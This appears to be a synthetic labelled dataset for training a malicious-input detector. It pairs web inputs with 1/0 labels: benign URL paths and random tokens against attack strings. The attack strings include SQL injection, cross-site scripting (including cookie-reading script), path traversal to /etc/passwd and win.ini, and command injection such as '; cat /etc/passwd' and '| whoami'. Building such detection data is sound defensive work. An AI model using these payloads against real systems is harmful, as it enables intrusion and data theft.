' OR 4=6 --,1
; cat /etc/passwd,1
../../../windows/win.ini,1
/cart?session=23868,0
cart,0
IrMkAKvZqCfQ0,0
/home?session=55671,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
Y5pF64GR5d,0
/blog?session=12735,0
/checkout?session=25956,0
VX4NijNRc,0
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
p96WwiFe,0
/home?session=80985,0
../../../../etc/passwd,1
QZKCI8LxM0Ojo,0
contact,0
IDggP9YK3I0q6J,0
<script>var a=924;alert(a)</script>,1
/login?session=94646,0
ahmVsX9Rd,0
settings,0
/settings?session=73012,0
lX6gO2IMDkOhE,0
' OR 9=6 --,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=978;alert(a)</script>,1
vbNrKEml2YSRU,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 2=6 --,1
blog,0
profile,0
/user?id=1545,0
/user?id=7825,0
' OR 7=4 --,1
admin' --,1
<script>var a=455;alert(a)</script>,1
' OR 5=1 --,1
' OR 8=1 --,1
<script>alert(document.cookie)</script>,1
/dashboard?id=8456,0
/contact?session=13472,0
' OR 4=9 --,1
javascript:alert(1),1
admin%00' OR 1=1,1
/home?id=8004,0
gP6WJiIlWo2gfk,0
' OR 3=7 --,1
/search?id=2492,0
| whoami,1
' OR '1'='1,1
' OR '1'='1,1
blog,0
settings,0
' OR 4=2 --,1
1EZZfY00qw,0
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=8 --,1
/checkout?id=1462,0
/user?id=2635,0
/profile?session=84419,0
MGDcmaYnPFs6B,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
/login?session=65419,0
1' o r '1'='1,1
BBMzWUvuX3gK,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=78;alert(a)</script>,1
/login?id=3879,0
checkout,0
1' o r '1'='1,1
' OR 1=1 --,1
/user?session=87873,0
' OR 3=4 --,1
onerror=alert(1),1
2EaSHdBILx,0
1' o r '1'='1,1
/about?id=3722,0
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=9849,0
javascript:alert(1),1
/user?id=9759,0
checkout,0
7B0APQxUC4a6Z,0
<script>var a=465;alert(a)</script>,1
Ky8V7UrTfuSOf0,0
javascript:alert(1),1
/home?id=1999,0
' OR 1=1 --,1
../../../../etc/passwd,1
/user?id=8950,0
blog,0
/register?session=13176,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
/cart?session=32110,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?id=8288,0
; cat /etc/passwd,1
/contact?id=750,0
/profile?session=51358,0
| whoami,1
index,0
uMYcCvrgZtexCbU,0
/blog?id=6972,0
cart,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
checkout,0
checkout,0
' OR 2=3 --,1
admin'/* bypass */OR 1=1,1
/contact?session=37548,0
' OR 5=1 --,1
/settings?session=31837,0
xftAdLp6jea5,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=3 --,1
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
<script>var a=957;alert(a)</script>,1
<script>var a=852;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 8=5 --,1
home,0
settings,0
T24M5Tdo0,0
' OR 1=4 --,1
' OR 6=9 --,1
' OR 8=9 --,1
/dashboard?id=6279,0
/login?id=4681,0
login,0
admin'/* bypass */OR 1=1,1
/index?id=2227,0
<script>alert(document.cookie)</script>,1
bfY3A9Ah,0
/index?session=68706,0
/cart?session=27562,0
index,0
/register?id=734,0
CkDTXMd2,0
<script>var a=170;alert(a)</script>,1
/dashboard?session=26226,0
register,0
/register?session=78599,0
/home?session=23165,0
HQscLStgcu4wAfH,0
../../../windows/win.ini,1
admin' --,1
checkout,0
blog,0
<script>var a=594;alert(a)</script>,1
1' o r '1'='1,1
wykxhpZrDNM,0
s E l E c T * f R o M a d m i n,1
checkout,0
yHXsn6oFw8dVoCI,0
<script>var a=113;alert(a)</script>,1
onerror=alert(1),1
uSdJSNaqgWW,0
' OR 1=1 --,1
settings,0
' OR 1=9 --,1
7LizSph6X0g,0
/login?id=960,0
../../../windows/win.ini,1
javascript:alert(1),1
settings,0
' OR 4=1 --,1
/dashboard?session=15258,0
/register?session=78046,0
/register?session=27534,0
cvUprU9hI,0
' OR 9=6 --,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
ZiyqFxvV2y8Z,0
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
<script>var a=95;alert(a)</script>,1
' OR 1=1 --,1
index,0
/login?id=7927,0
register,0
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
Yan8fy5krvr7S,0
/checkout?session=27060,0
' OR 1=1 --,1
../../../windows/win.ini,1
/home?id=446,0
/about?session=41138,0
/blog?id=164,0
admin%00' OR 1=1,1
register,0
javascript:alert(1),1
| whoami,1
/login?session=70958,0
c5j1lOtCDqx8b,0
<script>var a=964;alert(a)</script>,1
/contact?session=53482,0
<script>var a=654;alert(a)</script>,1
search,0
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
<script>var a=499;alert(a)</script>,1
/cart?session=36659,0
prPELhLUQnyauGf,0
<script>var a=127;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
| whoami,1
' OR 1=1 --,1
search,0
' OR 6=7 --,1
/settings?id=807,0
<script>var a=888;alert(a)</script>,1
' OR 6=2 --,1
/about?id=5071,0
5PGBDQZ1yN,0
' OR '1'='1,1
/dashboard?session=46160,0
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
/cart?id=9186,0
/contact?session=76559,0
/contact?session=80100,0
' OR 7=9 --,1
/register?id=1711,0
/blog?session=39741,0
/login?session=86581,0
onerror=alert(1),1
XymoocPeaKI,0
/contact?session=41401,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
' OR 2=8 --,1
settings,0
' OR 1=1 --,1
BilfhjG8GdIy6Ur,0
/contact?id=9865,0
<script>var a=270;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
admin' --,1
<script>var a=405;alert(a)</script>,1
profile,0
/checkout?session=89801,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 9=7 --,1
' OR 8=1 --,1
/settings?id=563,0
<script>var a=146;alert(a)</script>,1
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=55095,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
javascript:alert(1),1
; cat /etc/passwd,1
/search?id=4114,0
index,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
5nA5awnb7V,0
' OR 6=4 --,1
/user?session=34490,0
dashboard,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=3 --,1
/blog?session=86354,0
../../../windows/win.ini,1
/contact?session=68039,0
../../../windows/win.ini,1
neN9g4HzRzV,0
GuwCoNzk,0
/checkout?id=3403,0
/dashboard?session=19936,0
' OR '1'='1,1
profile,0
onerror=alert(1),1
/cart?id=9266,0
/register?session=68100,0
/profile?session=45630,0
/profile?id=7727,0
; cat /etc/passwd,1
home,0
register,0
blog,0
user,0
| whoami,1
1' o r '1'='1,1
contact,0
admin'/* bypass */OR 1=1,1
/login?id=5720,0
' OR 9=8 --,1
s E l E c T * f R o M a d m i n,1
<script>var a=714;alert(a)</script>,1
<script>var a=252;alert(a)</script>,1
' OR '1'='1,1
1ck2wLh3qWe,0
/home?id=4618,0
index,0
<script>var a=830;alert(a)</script>,1
oT7ZaprCvQO,0
/checkout?session=17287,0
wZx7nDFAUh5r7B,0
dqEkyjs0eIEia,0
ox2zjtbKpC5H,0
/index?id=1628,0
/profile?session=74892,0
onerror=alert(1),1
| whoami,1
admin'/* bypass */OR 1=1,1
profile,0
javascript:alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
admin' --,1
JRYX1OklFGLh,0
/cart?id=4067,0
/profile?id=1795,0
; cat /etc/passwd,1
/home?id=7049,0
<script>var a=905;alert(a)</script>,1
/cart?id=2696,0
../../../../etc/passwd,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
' OR '1'='1,1
search,0
eJIanz0Noa1z28,0
9JfmLWqA,0
/checkout?id=7209,0
' OR 5=5 --,1
dashboard,0
/contact?session=18861,0
/dashboard?id=6874,0
1' o r '1'='1,1
3zrjVExG,0
<script>var a=476;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
admin' --,1
AQLEqI1zfnc,0
; cat /etc/passwd,1
/settings?session=57375,0
/dashboard?id=9594,0
cart,0
/index?id=7403,0
admin'/* bypass */OR 1=1,1
user,0
' OR 9=9 --,1
onerror=alert(1),1
P1VWjnGJyAM,0
/profile?id=3021,0
<script>var a=530;alert(a)</script>,1
6xuxfeEd,0
' OR 1=7 --,1
/cart?session=72491,0
PjET9Dj5naa,0
/profile?id=5187,0
settings,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=803;alert(a)</script>,1
' OR 1=1 --,1
6XoAtl9rKfY,0
/settings?id=724,0
user,0
/contact?id=2382,0
admin%00' OR 1=1,1
<script>var a=338;alert(a)</script>,1
' OR 3=5 --,1
javascript:alert(1),1
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
onerror=alert(1),1
' OR 7=1 --,1
' OR 8=9 --,1
search,0
' OR 3=1 --,1
/cart?id=7671,0
/checkout?id=8959,0
/index?id=3116,0
' OR 8=6 --,1
' OR '1'='1,1
njIIY1ET41s,0
4b9W1pICnfaV,0
' OR 1=1 --,1
/dashboard?session=49281,0
profile,0
<script>var a=359;alert(a)</script>,1
cugGbWzjf4S,0
/checkout?session=31509,0
; cat /etc/passwd,1
profile,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
../../../windows/win.ini,1
/contact?session=33006,0
/cart?id=3855,0
/settings?id=6166,0
profile,0
/register?session=44729,0
tl6k2VexYpSq8,0
/profile?session=80179,0
; cat /etc/passwd,1
/index?id=9516,0
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
CG519A5nJ,0
/search?session=99733,0
/search?id=7480,0
/dashboard?id=2874,0
<script>var a=914;alert(a)</script>,1
| whoami,1
/cart?id=7414,0
admin%00' OR 1=1,1
/register?session=52072,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=779;alert(a)</script>,1
/dashboard?id=6665,0
' OR 3=4 --,1
/about?session=72665,0
eQ4SLrmra4I9,0
<script>var a=755;alert(a)</script>,1
/cart?id=864,0
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
blog,0
settings,0
' OR 8=6 --,1
onerror=alert(1),1
' OR 5=8 --,1
' OR 6=2 --,1
/checkout?id=9330,0
contact,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
sILxYOoMifr,0
/about?id=5846,0
/checkout?session=20045,0
onerror=alert(1),1
/profile?session=87560,0
/profile?session=42491,0
/dashboard?id=3218,0
s E l E c T * f R o M a d m i n,1
admin' --,1
/about?id=7081,0
admin'/* bypass */OR 1=1,1
profile,0
/index?session=96885,0
profile,0
| whoami,1
/login?id=9141,0
/register?session=19396,0
<script>var a=268;alert(a)</script>,1
/index?id=4811,0
blog,0
admin%00' OR 1=1,1
/checkout?session=90576,0
/cart?session=34782,0
../../../windows/win.ini,1
; cat /etc/passwd,1
login,0
s E l E c T * f R o M a d m i n,1
' OR 3=9 --,1
onerror=alert(1),1
<script>var a=585;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
' OR 8=5 --,1
/register?session=72586,0
s E l E c T * f R o M a d m i n,1
settings,0
admin'/* bypass */OR 1=1,1
search,0
4ymFDT70jSvpUD,0
<script>var a=761;alert(a)</script>,1
1' o r '1'='1,1
/search?session=34385,0
9wwYtXdFV6,0
<script>var a=834;alert(a)</script>,1
' OR '1'='1,1
/login?id=624,0
/home?id=5955,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?session=52303,0
admin' --,1
tTW2ZxJA,0
<script>var a=179;alert(a)</script>,1
/about?session=81261,0
admin' --,1
admin%00' OR 1=1,1
../../../windows/win.ini,1
Fca2mKByr3g,0
contact,0
' OR 1=4 --,1
login,0
/checkout?id=4247,0
/index?id=1053,0
/home?session=72885,0
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
xcnMQPyi2,0
' OR 7=2 --,1
' OR 1=1 --,1
/about?session=77564,0
/checkout?session=97917,0
admin%00' OR 1=1,1
admin' --,1
/search?id=2753,0
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
onerror=alert(1),1
1' o r '1'='1,1
/index?id=1589,0
/dashboard?id=1709,0
1' o r '1'='1,1
<script>var a=32;alert(a)</script>,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=67276,0
/contact?session=57325,0
admin%00' OR 1=1,1
home,0
kwa1HgWu37FuKP,0
/home?id=7771,0
<script>var a=942;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
../../../windows/win.ini,1
blog,0
/contact?session=27073,0
blog,0
search,0
user,0
checkout,0
../../../../etc/passwd,1
' OR 1=7 --,1
' OR 7=4 --,1
RHRvtc6p,0
index,0
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=55924,0
| whoami,1
/cart?session=69748,0
<script>var a=925;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
settings,0
/index?session=79973,0
/contact?id=1581,0
../../../windows/win.ini,1
../../../windows/win.ini,1
home,0
' OR 3=3 --,1
/user?id=3736,0
' OR 9=8 --,1
ofkQqv2mIdE0UU,0
onerror=alert(1),1
PTe6biRkc,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
EoKGDG5Ke6OK,0
lADakzzRiS7YjO,0
ekMug2K1fb,0
login,0
SmTu2mBAGhgx,0
/user?session=34553,0
CqaIF19mktnfQ,0
1' o r '1'='1,1
' OR '1'='1,1
register,0
admin'/* bypass */OR 1=1,1
dashboard,0
/settings?session=35737,0
<script>var a=390;alert(a)</script>,1
about,0
javascript:alert(1),1
' OR 2=5 --,1
' OR 5=7 --,1
' OR 1=1 --,1
/contact?session=90605,0
HL3KmmfYMNR,0
/cart?session=69647,0
user,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
' OR 6=2 --,1
' OR 7=8 --,1
' OR 8=5 --,1
' OR 1=1 --,1
<script>var a=839;alert(a)</script>,1
dashboard,0
/user?id=5754,0
1' o r '1'='1,1
1' o r '1'='1,1
' OR 9=9 --,1
../../../windows/win.ini,1
/blog?session=20436,0
/settings?session=12423,0
2owZb5HeFpYt2,0
/dashboard?session=22498,0
user,0
../../../windows/win.ini,1
admin' --,1
/home?session=29911,0
' OR 1=1 --,1
blog,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
register,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
about,0
gpSaezCQGrl,0
; cat /etc/passwd,1
QzOTA50xH,0
/home?session=23741,0
' OR 8=3 --,1
/search?id=4636,0
/blog?id=8252,0
9qlxXqo17UoF,0
pENUEOqkrC,0
/contact?id=9021,0
' OR 7=5 --,1
<script>var a=985;alert(a)</script>,1
/blog?id=6526,0
/home?session=75058,0
/checkout?id=6655,0
' OR 2=2 --,1
../../../windows/win.ini,1
index,0
/dashboard?session=75004,0
' OR 6=6 --,1
' OR 1=1 --,1
BimabvPGTinw,0
/settings?session=62525,0
MW7jpe27E3tr,0
' OR 4=1 --,1
javascript:alert(1),1
| whoami,1
s E l E c T * f R o M a d m i n,1
/blog?session=82433,0
profile,0
/search?session=53295,0
' OR 5=9 --,1
/contact?session=57894,0
<script>var a=788;alert(a)</script>,1
' OR 1=7 --,1
RueI5MbWyG7fdVP,0
ozC7JfWMdD,0
HQv5AAogal,0
/settings?session=57838,0
' OR 9=2 --,1
/settings?session=31215,0
/contact?session=96999,0
pjJ9OvgQku7OG,0
<script>alert(document.cookie)</script>,1
' OR 1=3 --,1
<script>var a=613;alert(a)</script>,1
vBynf2QlEG,0
<script>var a=825;alert(a)</script>,1
; cat /etc/passwd,1
/settings?id=9552,0
/profile?id=2179,0
s E l E c T * f R o M a d m i n,1
' OR '1'='1,1
/search?session=36699,0
/settings?session=96992,0
<script>var a=327;alert(a)</script>,1
login,0
' OR 4=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=4 --,1
' OR 9=3 --,1
admin' --,1
' OR '1'='1,1
../../../../etc/passwd,1
/blog?session=10709,0
/index?id=257,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=3 --,1
' OR 5=7 --,1
dashboard,0
blog,0
admin'/* bypass */OR 1=1,1
/dashboard?id=3503,0
B8bwPt04hkeHkD,0
' OR 1=8 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=3756,0
/dashboard?id=1630,0
<script>var a=814;alert(a)</script>,1
' OR 6=7 --,1
/login?session=71665,0
/blog?id=768,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=4596,0
' OR 8=7 --,1
/profile?id=4399,0
' OR 7=3 --,1
<script>var a=210;alert(a)</script>,1
admin%00' OR 1=1,1
/dashboard?session=46375,0
home,0
<script>var a=436;alert(a)</script>,1
admin' --,1
settings,0
search,0
' OR 6=1 --,1
/about?id=4180,0
javascript:alert(1),1
index,0
search,0
pKKZ6NuDalOIle,0
<script>var a=95;alert(a)</script>,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=4 --,1
/dashboard?id=3567,0
NKoUH7cdp,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
onerror=alert(1),1
<script>var a=910;alert(a)</script>,1
register,0
1HrlG8NTJM29Ii,0
onerror=alert(1),1
; cat /etc/passwd,1
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
onerror=alert(1),1
../../../windows/win.ini,1
/search?session=62779,0
register,0
' OR 9=2 --,1
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
/contact?id=991,0
s E l E c T * f R o M a d m i n,1
/about?session=21085,0
; cat /etc/passwd,1
/contact?id=7199,0
' OR 9=2 --,1
' OR 7=5 --,1
NqzeFWAeK,0
' OR 8=6 --,1
/user?session=26892,0
<script>var a=638;alert(a)</script>,1
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 6=1 --,1
/user?session=37715,0
admin'/* bypass */OR 1=1,1
login,0
/settings?id=1365,0
cart,0
' OR 9=8 --,1
kSMu8gpsAVbxiHA,0
index,0
/user?session=54821,0
admin%00' OR 1=1,1
/search?session=75618,0
/profile?id=5577,0
user,0
<script>var a=273;alert(a)</script>,1
| whoami,1
XGxZwA7d,0
checkout,0
<script>var a=625;alert(a)</script>,1
checkout,0
/checkout?session=60766,0
E8sCyQ727GW,0
admin%00' OR 1=1,1
/dashboard?id=6895,0
<script>var a=254;alert(a)</script>,1
97u7Za7cz6w6,0
/login?session=93803,0
checkout,0
admin' --,1
/register?session=52287,0
<script>var a=202;alert(a)</script>,1
P2MSUKVZy,0
/checkout?session=99343,0
G5tlVSPv,0
' OR 8=6 --,1
' OR 1=1 --,1
dashboard,0
javascript:alert(1),1
dashboard,0
/blog?id=8189,0
/blog?session=72523,0
/search?id=282,0
<script>var a=356;alert(a)</script>,1
/contact?session=33227,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?id=2125,0
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
/about?id=5874,0
<script>var a=231;alert(a)</script>,1
../../../../etc/passwd,1
<script>var a=542;alert(a)</script>,1
' OR 3=3 --,1
/settings?session=76389,0
contact,0
; cat /etc/passwd,1
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
' OR 7=5 --,1
admin%00' OR 1=1,1
Ng7h0U6Jeo,0
/cart?session=11519,0
' OR 4=6 --,1
ZKWR3pv3SeO,0
/cart?id=3257,0
admin'/* bypass */OR 1=1,1
/checkout?id=991,0
| whoami,1
/settings?id=3104,0
/cart?id=5236,0
/contact?session=86813,0
/home?session=99054,0
s E l E c T * f R o M a d m i n,1
<script>var a=618;alert(a)</script>,1
/blog?session=85103,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
cart,0
/register?session=19340,0
0Z5iT2C3sVEk,0
login,0
gkSsC9FfMTWI,0
<script>var a=555;alert(a)</script>,1
' OR 5=2 --,1
admin%00' OR 1=1,1
GKN7k0BUUBwud5,0
onerror=alert(1),1
' OR 1=2 --,1
<script>var a=865;alert(a)</script>,1
' OR 5=1 --,1
s E l E c T * f R o M a d m i n,1
checkout,0
<script>var a=332;alert(a)</script>,1
<script>var a=536;alert(a)</script>,1
<script>var a=92;alert(a)</script>,1
| whoami,1
bbMgdeeUi1T9,0
contact,0
about,0
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
YT4LkIt4,0
' OR 2=8 --,1
../../../windows/win.ini,1
register,0
admin' --,1
o7Ga5eYT3,0
settings,0
login,0
' OR 1=1 --,1
<script>var a=75;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
cart,0
s E l E c T * f R o M a d m i n,1
' OR 1=4 --,1
L6YAu7flE4az1uu,0
settings,0
; cat /etc/passwd,1
' OR 2=6 --,1
/contact?id=6083,0
/index?session=24634,0
simdcXd9jLJf,0
' OR '1'='1,1
<script>var a=200;alert(a)</script>,1
/login?session=11370,0
/user?id=6806,0
' OR 2=3 --,1
/dashboard?session=70901,0
' OR 1=1 --,1
/register?session=15393,0
profile,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=85674,0
user,0
9CSXQ4RHnf6xg2,0
<script>var a=174;alert(a)</script>,1
contact,0
h7uE3g0bRauZMN5,0
<script>var a=538;alert(a)</script>,1
/login?session=35419,0
MyWiMOkj,0
q4d6pulFre1K4y,0
/checkout?id=3141,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
NlFegoKND7,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=9964,0
/cart?session=12135,0
<script>var a=894;alert(a)</script>,1
/search?id=8339,0
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
/user?session=90780,0
' OR '1'='1,1
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=23153,0
onerror=alert(1),1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?session=69227,0
/dashboard?session=32037,0
gycv45xS,0
/profile?id=8862,0
/dashboard?session=38606,0
/home?id=6771,0
<script>var a=528;alert(a)</script>,1
/user?session=16917,0
admin'/* bypass */OR 1=1,1
iMb9nI7KJmd,0
| whoami,1
/home?session=57460,0
1' o r '1'='1,1
yZTlO0B0F6E,0
onerror=alert(1),1
/user?session=77721,0
/settings?session=51922,0
<script>var a=237;alert(a)</script>,1
/search?session=80485,0
' OR 3=3 --,1
/login?id=2888,0
/dashboard?session=29024,0
/checkout?session=37508,0
<script>var a=790;alert(a)</script>,1
register,0
<script>var a=702;alert(a)</script>,1
W1ELsx0xQ,0
' OR 3=3 --,1
/user?id=6997,0
' OR 7=9 --,1
E8T1hW5h5Y,0
/index?id=5520,0
iZt4Tgg6W,0
/blog?session=77077,0
contact,0
/contact?session=41867,0
/contact?session=37327,0
contact,0
' OR 1=1 --,1
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=9794,0
../../../windows/win.ini,1
onerror=alert(1),1
/checkout?session=10590,0
javascript:alert(1),1
/dashboard?session=59669,0
s E l E c T * f R o M a d m i n,1
jaKISJad9Ms,0
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
2T1Qd6Gf7whin,0
' OR 6=3 --,1
/contact?session=71838,0
../../../windows/win.ini,1
/cart?id=9962,0
javascript:alert(1),1
/register?session=33290,0
/cart?session=94479,0
../../../../etc/passwd,1
c8bsE2iRB7PH,0
checkout,0
/contact?id=3375,0
R69ZTjEJKRv9T,0
index,0
zQVBNe2B0P,0
<script>var a=67;alert(a)</script>,1
1' o r '1'='1,1
/home?id=8720,0
1' o r '1'='1,1
Jim8B1td5LeXD6g,0
/about?id=6269,0
1' o r '1'='1,1
' OR 8=4 --,1
7eRuPgG1F05,0
admin'/* bypass */OR 1=1,1
Utesk3sG,0
1WwNBNFIVzmYod,0
' OR 7=6 --,1
/home?session=41076,0
admin' --,1
<script>alert(document.cookie)</script>,1
profile,0
' OR 4=6 --,1
admin'/* bypass */OR 1=1,1
settings,0
90y0DnSZyborU7,0
8yGWdG70H4HJbT,0
sKIX5tpmCYg77a,0
88ZpgtyqEQjdOj9,0
' OR 3=8 --,1
<script>var a=578;alert(a)</script>,1
<script>var a=295;alert(a)</script>,1
/contact?id=245,0
' OR 6=5 --,1
' OR 1=1 --,1
/user?id=7983,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
about,0
<script>var a=312;alert(a)</script>,1
/about?session=29333,0
onerror=alert(1),1
' OR 5=9 --,1
user,0
<script>alert(document.cookie)</script>,1
' OR 6=5 --,1
; cat /etc/passwd,1
' OR 6=6 --,1
/cart?id=8144,0
/index?session=54321,0
javascript:alert(1),1
profile,0
' OR 2=9 --,1
' OR 1=1 --,1
3mYrOGWfUNw,0
cart,0
admin'/* bypass */OR 1=1,1
1' o r '1'='1,1
onerror=alert(1),1
/checkout?session=76826,0
' OR 8=4 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
profile,0
<script>var a=623;alert(a)</script>,1
admin%00' OR 1=1,1
<script>var a=90;alert(a)</script>,1
1' o r '1'='1,1
/cart?session=73279,0
<script>var a=347;alert(a)</script>,1
zTnMLwqJ,0
1' o r '1'='1,1
admin%00' OR 1=1,1
onerror=alert(1),1
; cat /etc/passwd,1
0Trlt4VoZ2T,0
settings,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
/login?id=6447,0
/about?id=9804,0
/register?id=3240,0
/contact?session=92402,0
/user?session=18225,0
search,0
javascript:alert(1),1
contact,0
cart,0
admin'/* bypass */OR 1=1,1
javascript:alert(1),1
birswsB8s,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/about?id=9505,0
<script>var a=199;alert(a)</script>,1
/home?id=9528,0
<script>var a=765;alert(a)</script>,1
user,0
' OR 8=4 --,1
UID20iJl,0
admin'/* bypass */OR 1=1,1
/checkout?session=47237,0
/register?id=6704,0
EWxbWaLvSC8os,0
/checkout?session=16154,0
login,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?session=29115,0
PwDvp91P,0
bPVZ8aXkqm,0
admin'/* bypass */OR 1=1,1
/profile?session=19708,0
rzC6olTO9LYihc,0
<script>var a=77;alert(a)</script>,1
<script>var a=871;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=602;alert(a)</script>,1
/index?session=83715,0
DciFOePo,0
/profile?id=8524,0
' OR 6=7 --,1
/home?session=56282,0
settings,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?session=62090,0
/search?id=9147,0
' OR 4=2 --,1
/dashboard?session=80719,0
admin'/* bypass */OR 1=1,1
G9kgTXFg7xrD,0
/cart?session=41863,0
/cart?id=8175,0
/profile?session=82091,0
/contact?id=168,0
<script>var a=316;alert(a)</script>,1
eE5YaPEmLhkH,0
6kVSpNqAZmiuB,0
' OR 1=8 --,1
| whoami,1
' OR 6=3 --,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
/profile?id=6260,0
/user?id=8096,0
/checkout?id=8393,0
/login?session=53393,0
/contact?id=8073,0
' OR '1'='1,1
' OR 6=9 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?id=6077,0
uQWuisLW4aq65,0
javascript:alert(1),1
rbPi7y4B679sAN,0
contact,0
admin'/* bypass */OR 1=1,1
d7wxOByE,0
/dashboard?id=1518,0
dashboard,0
home,0
8T5sTYkM3o7J,0
C4fziAuGmO,0
<script>var a=476;alert(a)</script>,1
checkout,0
lAcxYRnxmfyYoOd,0
' OR 2=7 --,1
admin'/* bypass */OR 1=1,1
/user?id=7579,0
mL1OuFdmf0PMWy,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=3432,0
/login?id=5338,0
admin%00' OR 1=1,1
' OR 2=5 --,1
whUWWR80fi6,0
checkout,0
1' o r '1'='1,1
/login?session=76725,0
OdRc2BwqOP,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
